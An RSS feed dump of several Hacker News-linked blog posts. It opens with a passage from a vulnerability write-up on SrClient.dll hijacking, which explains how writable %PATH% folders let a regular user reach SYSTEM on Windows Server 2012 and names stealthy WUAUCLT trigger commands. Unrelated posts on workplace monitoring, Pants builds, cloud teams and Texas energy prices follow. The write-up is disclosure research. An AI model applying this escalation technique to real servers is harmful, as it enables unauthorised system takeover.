executed after being called by an EXE.</p><h3 id="dll-search-order">DLL Search Order</h3><p>Microsoft says <a href="https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability/">this</a> about the DLL Search Order:</p><blockquote>when an application loads a DLL without specifying a fully qualified path, Windows attempts to locate the DLL by searching a well-defined set of directories in an order known as <strong>DLL search order</strong>.</blockquote><p>Starting with Windows XP SP2, the default DLL search order on Windows systems is something like this:</p><ol><li>The directory from which the application loaded.</li><li>The system directories. On modern 64-bit systems these are C:\Windows\System32 (64-bit programs and libraries - yes you are reading that right, the names are counterintuitive) and C:\Windows\SysWOW64 (32-bit programs and libraries). SysWOW64 is logically absent on 32-bit systems, where C:\Windows\System32 coexists with C:\Windows\System (16-bit programs and libraries).</li><li>The Windows directory (C:\Windows)</li><li>The current directory.</li><li>The directories that are listed in the <code>%PATH%</code> environment variable.</li></ol><h3 id="path">PATH</h3><p>PATH is an environment variable in Windows as well as Unix-like operating systems including Linux and MacOS. Basically, PATH is a special kind of variable that specifies a set of directories where executable programs are located. In Windows, this variable is referenced as %PATH%. <strong>In this article, I use %PATH% to refer exclusively to the system PATH, which <u>cannot be modified by regular users</u></strong>. It does not refer to the user PATH, which <em>can</em> be modified by regular users. For more info, see the <a href="https://en.wikipedia.org/wiki/PATH_(variable)">Wikipedia entry</a>.</p><h3 id="dll-hijacking-and-path-">DLL hijacking and %PATH%</h3><p>On a clean installation of any modern Windows system, <code>%PATH%</code> does not contain directories with weak permissions that would allow for the attack described in this article. However, many third-party applications add directories to <code>%PATH%</code> during installation and those directories aren’t always securely configured. As a result, it is not uncommon in corporate environments to find Windows systems that allow one or more regular users to write arbitrary data to <code>%PATH%</code> directories. If this is the case on a Windows Server 2012 system, it could be child's play for an attacker with the privileges of one such regular user to escalate privileges to <code>NT AUTOHRITY\SYSTEM</code> via SrClient.dll hijacking.</p><h2 id="0x01-identifying-the-vulnerability">0x01 Identifying the Vulnerability</h2><p>In this article I'm standing on the shoulders of giants. Well, I don't know how tall Clément Labro (<a href="https://twitter.com/itm4n">@itm4man</a>) is, but I found this vulnerability as a result of their discovery of the <a href="https://itm4n.github.io/windows-server-netman-dll-hijacking/">NetMan DLL Hijacking vulnerability that affects all editions of Windows Server, from 2008R2 to 2019</a>. I recently came across their excellent writeup of this issue, and decided to spin up a Windows Server VM to try and replicate their findings. I have multiple Windows VMs set up for research purposes, and it was pure chance that I picked a Server 2012 system.</p><p>After booting up, I launched <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a> (procmon64.exe) and added a few filters to have it display any and all failed attempts by running processes to load a DLL or EXE file from <code>C:\Windows\System32\WindowsPowerShell\v1.0\</code>, which is part of %PATH% by default. Events that match these filters would most likely indicate that Windows was trying to load a non-existing resource by relying on the DLL search order, and would therefore represent potential DLL Hijacking / Binary planting vulnerabilities.</p><p>Initially the events field remained empty, and when I finally started getting a few results, none of them were for the <code>wlanapi.dll</code> or <code>wlanhlp.dll</code> resources, which would be evidence of the NetMan DLL vulnerability. So far this was expected, since that vulnerability is only triggered under specific circumstances. I therefore started looking into Clément Labro's exploit to trigger the flaw. After a while I glanced at my VM again, and noticed something interesting: the process <code>TiWorker.exe</code> had tried to load a resource called <code>SrClient.dll</code> from the aforementioned PowerShell directory. I inspected the event and noticed that the process was running as <code>NT AUTORITY\SYSTEM</code>.</p><figure><img src="https://blog.vonahi.io/content/images/2021/02/srclient-marked-5.png" alt="" srcset="https://blog.vonahi.io/content/images/size/w600/2021/02/srclient-marked-5.png 600w, https://blog.vonahi.io/content/images/2021/02/srclient-marked-5.png 761w" sizes="(min-width: 720px) 720px"></figure><p>Moreover, the Stack Trace of the event included references to <code>rpcrt4.dll</code>, which Clément Labro mentioned as a sign that the event was likely triggered via RPC/COM and could therefore possibly be triggered by a regular user. In line with the NetMan DLL hijacking write-up, I then launched a search query on my Windows 10 host for <code>SrClient.dll</code>, and I found it at <code>C:\Windows\System32\SrClient.dll</code></p><figure><img src="https://blog.vonahi.io/content/images/2021/02/srclient_dll_windows102.png" alt=""></figure><p>So far my findings were almost identical to those for the NetMan DLL hijacking vulnerability:</p><ul><li>A process on a Windows Server edition tried to load a non-existent DLL via the DLL Search Order</li><li>The calling process was running as <code>NT AUTORITY\SYSTEM</code></li><li>The event was likely triggered via RPC/COM</li><li>The DLL did exist on Windows 10</li></ul><p>At this point, I was starting to believe that I may have actually stumbled onto something big, but I tried to compose myself as I knew it might not be possible to actually trigger the vulnerability as a regular user. While I proceeded to look into this right away, I first want to address some discoveries I made later regarding the systems that are actually affected by this.</p><h3 id="checking-for-affected-systems">Checking for affected systems</h3><p>When I tried to replicate my findings on other Windows Server versions, I discovered that none of them seemed vulnerable. On Windows Server 2016, 2019 and to my surprise even 2012R2, <code>SrClient.dll</code> does not exist and <code>TiWorker.exe</code> will try to load it, but only from <code>C:\Windows\System32\</code>, which is the correct path in Windows 10. Because the DLL Search Order is not used, DLL hijacking to achieve privilege escalation is out of the question.</p><figure><img src="https://blog.vonahi.io/content/images/2021/02/windows_server_not_vuln_procmon.png" alt=""></figure><p>On Windows Server 2008R2 I wasn't able to trigger this event at all, so I assume that OS isn't vulnerable either. I don't have a Windows Server 2008 VM to test this on, but my guess is that it doesn't differ from 2008R2 when it comes to SrClient.dll.</p><p>Somewhat dismayed by these findings, and a little concerned about the fact that Windows Server 2012R2 didn't even seem vulnerable, I downloaded a fresh Windows Server 2012 ISO evaluation image from the <a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2012">Microsoft Evaluation Center</a> and installed all possible updates on it, including this month's Patch Tuesday rollup (<a href="https://support.microsoft.com/en-us/topic/february-9-2021-kb4601348-monthly-rollup-2c338c0c-73d6-fb80-cc91-f1a86e80db0c">KB4601348</a>). I then tried to trigger the vulnerability (which I had learned how to do, see below) and... it worked!</p><figure><img src="https://blog.vonahi.io/content/images/2021/02/update_still_vulnerable_evidence---marked.png" alt="" srcset="https://blog.vonahi.io/content/images/size/w600/2021/02/update_still_vulnerable_evidence---marked.png 600w, https://blog.vonahi.io/content/images/2021/02/update_still_vulnerable_evidence---marked.png 621w"></figure><h2 id="0x02-triggering-the-vulnerability">0x02 Triggering the Vulnerability</h2><p>I started my search for a way to trigger this vulnerability at the source: <code>TiWorker.exe</code>. I probably should have been familiar with this process, but I wasn't. Fortunately, a quick web search <a href="https://www.file.net/process/tiworker.exe.html">revealed</a> that it is part of the <em>Windows Module Installer Service</em>, the purpose of which is to download and install Windows Update packages. It resides in <code>C:\Windows\servicing</code>, just like its parent process <code>TrustedInstaller.exe</code>, which is also part of the <em>Windows Module Installer Service</em>. Because of the link with Windows Update, I decided to check if I could get <code>TiWorker.exe</code> to launch by checking for updates on my test system via the Control Panel. To my amazement, this worked right off the bat!</p><figure><img src="https://blog.vonahi.io/content/images/2021/02/windows_update-1.png" alt="" srcset="https://blog.vonahi.io/content/images/size/w600/2021/02/windows_update-1.png 600w, https://blog.vonahi.io/content/images/2021/02/windows_update-1.png 639w"></figure><p>Of course, in order to be able to exploit this in a real-world scenario, it would be far better to pull the trigger from the command line, that is CMD.exe or PowerShell. My initial search directed me toward the latter, but fortunately <a href="https://twitter.com/altonjx">Alton</a> suggested I check out <code>WUAUCLT</code> (Windows Update Automatic Update Client) and its <a href="https://www.idkrtm.com/windows-update-commands/">commands</a>, all of which can be run from CMD.exe. And sure enough, after some trial and error, I managed to trigger the vulnerability when running <code>WUAUCLT</code> with the one of the following commands:</p><ul><li><code>/SelfUpdateManaged</code> - This launches the Windows Update window in the Control Panel and tells it to start checking for updates using <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus">Windows Server Update Services (WSUS)</a>.</li><li><code>/SelfUpdateUnManaged</code> - Similar to the one above, but it uses the Windows Update website instead of WSUS.</li><li><code>/DetectNow</code> - This will detect and download available updates in the background.</li></ul><p>Of these possible triggers, only <code>WUAUCLT /DetectNow</code> is relatively stealthy because it will run in the background. The other two will launch the Windows Update UI, which a legitimate user would obviously notice. However, even in that scenario, users may not actually recognize this event as something malicious. Windows Update has a reputation of pushing updates in the absence of informed consent by users (mostly because the latter haven't properly configured it). As a result, some users would probably interpret the event as just another example of how capricious the update service is.</p><p>By now, I felt like jumping out of my chair with joy, but I tried to compose myself as I still needed to verify a few things, namely:</p><ul><li>Could a regular user trigger the vulnerability in the manner just described?</li><li>Would this also work for a world-writable directory that I would add to %PATH%? (I couldn't think of a reason why it shouldn't, but you never …</li></ul></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.vonahi.io/srclient-dll-hijacking">https://blog.vonahi.io/srclient-dll-hijacking</a></em></p>]]>
            </description>
            <link>https://blog.vonahi.io/srclient-dll-hijacking</link>
            <guid isPermaLink="false">hacker-news-small-sites-26229098</guid>
            <pubDate>Mon, 22 Feb 2021 19:18:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Prodoscore: The Bleak Future of Work]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26229096">thread link</a>) | @dengsauve
<br/>
February 22, 2021 | https://blog.dennissauve.com/posts/2021-02-21_prodoscore-the-bleak-future-of-work/ | <a href="https://web.archive.org/web/*/https://blog.dennissauve.com/posts/2021-02-21_prodoscore-the-bleak-future-of-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <h2>Prodoscore: The Bleak Future of Work</h2>

        <!-- Thesis -->
        <p>
            I recently took a sales pitch from Prodoscore at the behest of a colleague, and now I'm very concerned about
            the future of work. Much in the way that a poor (or even average) credit score can damage and ruin your
            chances
            at some opportunities, so too will a productivity score define your relative worth as an employee by
            reducing
            every aspect of your daily work life into a single number - your "Prodoscore". The sales pitch of course was
            presented in a light of "helping employers identify 'less productive' employees, and give transparency to
            team
            leaders on performance". At least at first.
        </p>

        <!-- Tangent/Support 1 -->
        <p>
            <em>A Credit Score for your Career</em> was the phrase that piqued my interest. I pushed the salesperson a
            bit,
            asking if the score would follow you if your next employer also used Prodoscore. She said no, but then went
            on a tangent of remembering that she'd heard a C-level saying he envisioned a more permanent Prodoscore,
            something
            that people could put on their resume. That's when I turned from curious to concerned.
        </p>

        <!-- Tangent/Support 2 -->
        <p>
            By tying into APIs from Google, SalesForce, and LinkedIn (the examples provided to me) the Prodoscore tool
            takes a granular look at your activities over the day, and then compares those against other employees and
            what they're doing. The amount of data you can see is amazing, and disturbing. The tools gives you full
            access to
            the user's sent emails, as well as other actions (I'd imagine you could get some pretty cool data using
            Slack as
            well).
        </p>

        <!-- Tangent/Support 3 (repeat as necessary) -->
        <p>
            I asked the salesperson (who was demoing her real Prodoscore used day to day) if there was any stress from
            knowing that your entire workday was exposed like that, or if there's any trepidation in showing complete
            strangers where you stack up in a company. She countered and said not only is there not much stress, but
            that
            she believes it's actually relieving stress. "At the end of the day, the score doesn't matter... it only
            matters
            when it's low" wasn't an inspiring pitch, but it illuminated the nature of these tools. If you're lagging,
            we're
            going to put you under a microscope and find out why.
        </p>

        <!-- Conclusion -->
        <p>
            Ultimately, Prodoscore still feels too immature to worry about. It's mostly a tool, for CEOs and companies
            who don't trust their employees, to spy on and dissect their employee's day second by second. Give it 5
            years.
            I hate to imagine what social media spin Prodoscore and their competition apply to this. I'm reminded of the
            Scrum bit on Silicon Valley - where Jared dupes Dinesh and Gilfoyle into competing with each other, even
            though
            they both know exactly what Jared is doing.
        </p>

        <img src="https://media.giphy.com/media/xT1XGOGdyDrL2BTfxK/source.gif">

        <p>
            Even though Dinesh and Gilfoyle both knew that Jared was only pitting them against each other to make them
            perform better for the same reward (shares in the company), they grudgingly capitulated - and even began
            to compete with each other! It doesn't take much imagination to connect the two scenarios, except on a
            global scale, the outcome could possibly be yet another barrier to employment.
        </p>

    </article><section>

    <h2>About</h2>
    <hr>

    <p>
        I'm a software developer, philanthropist, biker, cyclist, hiker, gamer, drone pilot, photo bug, and all around
        DIY enthusiast. I like to think I can cook, and enjoy a good game of PUBG/WarZone every now and then.
    </p>

    <p>
        Yell at me on <a href="https://twitter.com/dengsauve">twitter</a>,
        <a href="https://github.com/dengsauve">github</a>,
        and at <a href="https://dennissauve.com/">home</a>.
        Typically present with the handle <code>@dengsauve</code> on most sites.
    </p>

</section></div>]]>
            </description>
            <link>https://blog.dennissauve.com/posts/2021-02-21_prodoscore-the-bleak-future-of-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26229096</guid>
            <pubDate>Mon, 22 Feb 2021 19:17:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Codegen caching with minimal boilerplate: Protobuf Dependency Inference in Pants]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26229023">thread link</a>) | @pantsbuild
<br/>
February 22, 2021 | https://blog.pantsbuild.org/pants-2-2-adds-dependency-inference-for-protobuf/ | <a href="https://web.archive.org/web/*/https://blog.pantsbuild.org/pants-2-2-adds-dependency-inference-for-protobuf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>As discussed <a href="https://blog.pantsbuild.org/dependency-inference/">in our post on dependency inference</a>, Pants understands which files depend on which to offer fine-grained caching. If none of the inputs have changed, Pants can safely cache your builds like running tests and generating code.</p><p>With conventional scalable build tools, this fine-grained invalidation requires substantial boilerplate: maintaining BUILD files that explicitly declare every dependency. Instead, Pants uses <em>dependency inference</em> to reduce this boilerplate by up to 90% by reading your code and figuring out the dependencies for you.</p><p>As of Pants 2.2, Pants now knows how to use dependency inference with <a href="https://developers.google.com/protocol-buffers/">Protobuf</a>! This includes:</p><ul><li>Protobuf imports of other Protobuf files.</li><li>Python imports of generated Protobuf code, including gRPC.</li></ul><p>While Pants currently only generates code with Protobuf, we are eager to work with <a href="https://www.pantsbuild.org/docs/community">community members</a> to support other protocols like Apache Thrift.</p><hr><h3 id="wth-is-pants">WTH is Pants?</h3><p>Pants is a scalable build tool, meaning that it orchestrates the tools you use in a modern Python repository, like Black, Pytest, Protoc (Protobufs), and setuptools. Pants will run these and many other tools concurrently, and brings fine-grained caching with minimal boilerplate, including as your codebase scales up in size.</p><p>See <a href="https://blog.pantsbuild.org/introducing-pants-v2/">blog.pantsbuild.org/introducing-pants-v2/</a>.</p><hr><h2 id="how-it-works">How it works</h2><p>Pants will first look at your repository's code layout and your Protobuf and Python file names to develop a global mapping. For example, we know that <code>protos/project/models.proto</code> corresponds to the Protobuf import <code>project/models.proto</code> and the Python modules <code>project.models_pb2</code> and (possibly) <code>project.models_pb2_grpc</code>.</p><p>With this global mapping computed, Pants then parses the relevant files to extract their import statements and look up the corresponding owner, if any.</p><p>For example, given this Proto:</p><pre><code>// protos/build/remote/execution/remote_execution.proto
package build.remote.execution;

import "build/semver/semver.proto";
import "google/api/annotations.proto";
import "google/rpc/status.proto";
import "google/protobuf/duration.proto";</code></pre><p>Pants infers dependencies on the correct Protobuf files:</p><pre><code>❯ ./pants dependencies protos/build/remote/execution/remote_execution.proto
protos/build/semver/semver.proto
protos/google/api/annotations.proto
protos/google/rpc/status.proto
protos/google/protobuf/duration.proto</code></pre><p>Pants will also understand Python imports of these Protobuf files, normalizing their full paths into Python module names:</p><pre><code># src/py/project/app.py
import build.semver.semver_pb2
import google.api.annotations_pb2_grpc</code></pre><pre><code>❯ ./pants dependencies src/py/project/app.py
protos/build/semver/semver.proto
protos/google/api/annotations.proto</code></pre><p>As discussed in <a href="https://blog.pantsbuild.org/fast-incremental-builds-speculation-cancellation/">our post on Pants's performance</a>, this inference is 1) very safe and 2) very fast. Because Pants invokes processes hermetically with a sandbox, failing to infer a dependency can never cause the wrong thing to be cached. Further, the inference is fast thanks to Pants's core being implemented in Rust, along with a daemon, parallelism, and very fine-grained invalidation.</p><h2 id="trying-out-pants">Trying out Pants</h2><p>Using Pants ensures that your builds always use your up-to-date Protobuf code—no more need to manually invoke scripts! Further, thanks to Pants's fine-grained understanding of your project's dependencies, you will only ever generate the Protobuf files you actually need.</p><p>We optimized Pants to be easy to <a href="https://www.pantsbuild.org/docs/existing-repositories">add incrementally to existing repositories</a>, including an upcoming feature in Pants 2.3 to auto-generate BUILD files (stay tuned for a blog post!).</p><p>The <a href="https://www.pantsbuild.org/docs/community">Pants community</a> would love to help you get started. <a href="https://www.pantsbuild.org/v2.1/docs">www.pantsbuild.org/docs</a><br></p>
			</section></div>]]>
            </description>
            <link>https://blog.pantsbuild.org/pants-2-2-adds-dependency-inference-for-protobuf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26229023</guid>
            <pubDate>Mon, 22 Feb 2021 19:12:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why 'central cloud teams' fail]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26229021">thread link</a>) | @forrestbrazeal
<br/>
February 22, 2021 | https://acloudguru.com/blog/engineering/why-central-cloud-teams-fail-and-how-to-save-yours | <a href="https://web.archive.org/web/*/https://acloudguru.com/blog/engineering/why-central-cloud-teams-fail-and-how-to-save-yours">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p>Early in my cloud career, I joined a “central cloud team” for a big enterprise. We created the automation, infrastructure, and standards for dozens of product teams who were <a href="https://acloudguru.com/blog/business/what-is-cloud-migration" target="_blank" rel="noopener noreferrer">migrating</a> to AWS. Anybody who wanted to get to the cloud had to come through us, the experts. (This was back before the release of AWS Organizations, when large, shared AWS accounts were the norm at many shops).</p><p>Here’s the thing: we were <i>good</i>. I thought we didn’t need formal cloud training because we could just look up documentation to figure out new tools and services. In fact, we felt a little superior when we heard about other teams asking for special training to use the cloud. We were high-flying 10x engineers! We didn’t need all that!</p><p>Fast forward several years, though, and <strong>nearly every engineer on that team has left the company, burned out and disillusioned by their job</strong>. Worse, many of the cloud-native efforts we championed fell by the wayside. And having now worked in-house and as a consultant for many enterprises, I have seen this pattern over and over again, as up to <a href="https://searchcio.techtarget.com/feature/Cloud-migration-failures-and-how-to-prevent-them" target="_blank" rel="nofollow noopener noreferrer">three-quarters of cloud migrations fail</a> despite high initial expectations.</p><p>So what went wrong?</p><h3 id="h-why-central-cloud-teams-fail">Why central cloud teams fail</h3><p>Central cloud teams, often established at the beginning of an organization’s cloud transformation, have three common characteristics:</p><ul><li>They’re <strong>small </strong>relative to the rest of the IT org — often fewer than ten people. Cloud experts are hard to find!</li><li>They’re <strong>high-performing</strong>, the kind of engineers who can build quickly and learn by themselves. After all, that’s why they gravitated toward roles where they are constantly exposed to cutting-edge services and features.</li><li>They operate with a high degree of <strong>autonomy</strong>. They have leeway to try new services and set best practices for the cloud organization. They often have a visionary “executive sponsor” running interference for them as well.</li></ul><p>These teams, like mine did, think they are adhering to the <a href="https://aws.amazon.com/blogs/enterprise-strategy/using-a-cloud-center-of-excellence-ccoe-to-transform-the-entire-enterprise/" target="_blank" rel="nofollow noopener noreferrer">Cloud Center of Excellence mindset</a> by setting themselves up as the “cloud gatekeepers” for their organization.</p><p>And in doing so, they may create a bottleneck for the entire company’s cloud adoption efforts — the exact opposite of their goal. That’s because centralized cloud teams <i>do not scale.</i></p><h3 id="h-the-scourge-of-support-tickets">The scourge of support tickets</h3><p>I don’t care how good at the cloud you personally are — nobody cannot survive long-term as the sole repository of cloud knowledge for their entire organization.</p><p>Oh, it’ll be okay at first. You get to work on lots of cool stuff. And it feels good to be the cloud experts that others come to for help.</p><p>But when more teams start trying to adopt the cloud and use your guidelines, you’ll get absolutely clobbered by every engineer’s worst nightmare: <strong>support tickets</strong>. On that first job I was telling you about, every engineer on my team was eventually spending one to two scheduled days a week just triaging cries for help in Jira. Hundreds of cloud newbies who didn’t know EC2 from S3, who couldn’t figure out how to use the AWS CLI, were consuming up to 50% of our brightest (and best-paid) engineers’ time.</p><div><figure><img loading="lazy" width="1784" height="953" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob.png" alt="Reality vs Expectation" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob.png 1784w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob.png 300w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob.png 1024w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob.png 768w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob.png 1536w" sizes="(max-width: 1784px) 100vw, 1784px"></figure></div><p>And as the central cloud team’s time and energy to handle support requests decreases, it has a cascading effect on the broader team’s ability to succeed.</p><p>If you’re looking for a shorthand metric to gauge the success of your cloud transformation, try <i>support ticket volume. </i>That’s why your best engineers get burned out and leave. It’s why cloud migrations stall. It’s a leading indicator of how successful your central team (the experts) have been at transferring their knowledge to the organization as a whole.</p><p>To paraphrase the great cloud architect William Butler Yeats: things fall apart, the central cloud team cannot hold.</p><h3 id="h-the-solution-comprehensive-fluency">The solution: comprehensive fluency</h3><p>The only way I know of to save the central cloud team’s sanity and speed up cloud adoption is <a href="https://info.acloud.guru/resources/how-many-cloud-training" target="_blank" rel="nofollow noopener noreferrer"><i>comprehensive fluency</i></a><i>.&nbsp;</i></p><p>That’s right: your goal should be for everybody who builds stuff headed for the cloud, central experts or otherwise, to be able to speak cloud like it’s their native language. And I’ve got years of failures in my past to attest: that doesn’t just happen.</p><p>If central cloud teams start off small, high-performing, and autonomous, the rest of your organization is large, slow-moving, and interdependent. Everyone has legacy technologies to worry about. Cloud fluency doesn’t happen unless you make it happen.</p><p>And that’s where the central cloud team can finally shine.</p><h3 id="h-enabling-fluency">Enabling fluency</h3><p>Like any other organism, your cloud center of excellence will die unless it can figure out how to reproduce. Fundamentally, the central cloud team has to change their mission from <i>expertise </i>(knowing the most about cloud) to <i>enablement </i>(creating more people who know about cloud)<i>.&nbsp;</i></p><p><strong>Embed experts with product teams</strong></p><p>You wouldn’t put all your servers in one availability zone, so don’t put all your knowledge on the central cloud team.</p><p>Set up a rotation that assigns your central cloud experts directly to the product teams that need them most. Through daily standups, code reviews, and pair programming, they can help raise the maturity of your teams in real time.</p><p>The USA used the same tactic to win the air war in World War II: they <a href="https://books.google.com/books?id" target="_blank" rel="noopener noreferrer">sent their best pilots home to train others</a>, while the Germans kept their aces on the front lines until they were shot down.</p><p>When one team reaches an acceptable baseline of fluency, you can reassign the expert, like a flight instructor moving on to a new crop of recruits. Channeling expertise into enablement keeps your entire team in fighting shape.</p><div><figure><img loading="lazy" width="2144" height="2028" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob-1.png" alt="comic - Are you investing in cloud translation" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob-1.png 2144w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob-1.png 300w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob-1.png 1024w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob-1.png 768w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob-1.png 1536w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/blob-1.png 2048w" sizes="(max-width: 2144px) 100vw, 2144px"></figure></div><p><strong>Create baselines of cloud fluency</strong></p><p>The central cloud team’s expertise is still essential to define that fluency baseline, so lay out your security, automation, and tooling standards in a place where everyone can access them.</p><p>You should also identify the cloud services everyone is expected to understand. If you’re in AWS, a good shortlist would likely include foundational services like IAM, VPC, and CloudFormation.</p><p>Many teams I’ve worked with require product teams to demonstrate their grasp of these baselines before they get access to their own cloud environments. But you need more validation than just a “thumbs up, I read the docs”. That’s where certification comes in.</p><p><strong>Provide clear training and certification paths</strong></p><p>Many ACG customers assign a foundational course like the AWS Certified Solutions Architect Associate course as part of onboarding for all new engineering hires. Whether or not everyone goes on to sit the certification exam, working through the course material creates a “lingua franca” for the cloud — a shared language everybody speaks.</p><p>But beyond the shared baseline, it’s also a good idea to match the right training to the right roles. Architects and developers need different expertise than data engineers or infosec. Look at something like ACG’s Learning Paths to lay out standardized plans that fit a variety of competencies.</p><p><strong>Establish support and incentives</strong></p><p>People learn best when they are motivated to succeed. So establish study groups and Slack channels to support your learners. Lean into goofy ceremonies to congratulate people who achieve the big cert. (A Cloud Guru has a “Wall of Fame” in our Austin office where we post Polaroids of every employee who achieves a certification.) Positive peer pressure works wonders!</p><p>The best incentive, though, is the cloud itself. You hired good people, they want to get work done in the cloud. Set the prerequisites for them to demonstrate competence, and they’ll rise to the challenge — <a href="https://info.acloud.guru/resources/value-cloud-certifications" target="_blank" rel="nofollow noopener noreferrer">93% of IT managers find</a> that certified employees provide value above and beyond the cost of skilling up.</p><hr><div><figure><a href="https://go.acloudguru.com/value-of-cloud-certifications-ebook"><img loading="lazy" width="262" height="243" src="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/06/why-cloud-certs-banners.png" alt="Book - Why Cloud Certs? Why Now?"></a></figure></div><h2 id="h-why-cloud-certs-why-now"><strong><a href="https://go.acloudguru.com/value-of-cloud-certifications-ebook" target="_blank" rel="noreferrer noopener">Why cloud certs, why now?</a></strong></h2><p>Download <i><a href="https://go.acloudguru.com/value-of-cloud-certifications-ebook" target="_blank" rel="noreferrer noopener">Why Cloud Certs, Why Now?</a></i> to discover the many ways cloud certifications create value for your business. <a href="https://go.acloudguru.com/value-of-cloud-certifications-ebook" target="_blank" rel="noreferrer noopener">Get the goods!</a></p><hr><h3 id="h-the-surprising-conclusion">The surprising conclusion</h3><p>The most surprising thing I’ve learned about cloud adoption in the last ten years? <strong>Your experts need training just as much as anyone else.</strong> Not so much for their own information, but for the teams they are guiding to the cloud. It’s the only way to protect their sanity and scale your cloud adoption.</p><p>To quote another cloud engineer, Robert Frost: some say the world will end in fire, some say in ice. But without comprehensive fluency, the central cloud team is sure to drown in support requests.</p><p>Take my word for it. I think I’m still assigned a Jira ticket from 2015 that just says “need help with AWS.”</p><p><i>Forrest Brazeal is an AWS Serverless Hero</i> <i>and enterprise architect who has led cloud adoption initiatives for companies ranging from startups to the Fortune 50.</i></p><hr><p><em>ACG for Business now includes <a href="https://acloud.guru/cloud-playground" target="_blank" rel="noopener noreferrer">Cloud Playground</a>: fast, fresh, throwaway cloud environments so your team can learn by doing.</em></p></div></div></div>]]>
            </description>
            <link>https://acloudguru.com/blog/engineering/why-central-cloud-teams-fail-and-how-to-save-yours</link>
            <guid isPermaLink="false">hacker-news-small-sites-26229021</guid>
            <pubDate>Mon, 22 Feb 2021 19:12:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[(Texas) – Griddy: Why energy prices were sky high this week]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26228930">thread link</a>) | @rluhar
<br/>
February 22, 2021 | https://www.griddy.com/post/griddy-update-why-energy-prices-were-sky-high-this-week | <a href="https://web.archive.org/web/*/https://www.griddy.com/post/griddy-update-why-energy-prices-were-sky-high-this-week">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>At Griddy, transparency has always been our goal. We know you are angry and so are we. Pissed, in fact. Here’s what’s been going down: </p><p>On Monday evening the Public Utility Commission of Texas (PUCT) cited its “<a href="http://www.puc.texas.gov/51617WinterERCOTOrder.pdf" target="_blank">complete authority over ERCOT</a>” to direct that ERCOT set pricing at $9/kWh until the grid could manage the outage situation after being ravaged by the freezing winter storm. &nbsp;</p><p>Under ERCOT's market rules, such a pricing scenario is only enforced when available generation is about to run out (they usually leave a cushion of around 1,000 MW). This is the energy market that Griddy was designed for – one that allows consumers the ability to plan their usage based on the highs and lows of wholesale energy and shift their usage to the cheapest time periods. &nbsp;</p><p>However, the PUCT changed the rules on Monday. &nbsp;</p><p>As of today (Thursday), 99% of homes have their power restored and available generation was well above the 1,000 MW cushion. Yet, the PUCT left the directive in place and continued to force prices to $9/kWh, approximately 300x higher than the normal wholesale price. For a home that uses 2,000 kWh per month, prices at $9/kWh work out to over $640 per day in energy charges. By comparison, that same household would typically pay $2 per day. &nbsp;</p><p>See (below) the difference between the price set by the market's supply-and-demand conditions and the price set by the PUCT's “complete authority over ERCOT.” 